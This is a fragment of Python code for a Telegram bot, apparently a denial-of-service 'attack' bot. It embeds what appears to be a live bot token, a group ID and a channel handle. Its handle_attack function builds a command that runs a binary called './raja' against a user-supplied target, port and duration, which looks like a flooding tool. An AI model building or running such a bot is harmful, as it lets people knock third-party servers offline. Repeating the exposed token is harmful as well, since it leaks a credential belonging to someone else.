...
bot = telebot.TeleBot('8057906498:AAGh2u-C--7d0cdFT5eercaxpL0_Tl3MVEw')
...
GROUP_ID = "-1002363042115"
CHANNEL_USERNAME = "@XCLANOP"
...
def handle_attack(message):
    ...
    full_command = f"./raja {target} {port} {time_duration} 900 1200"
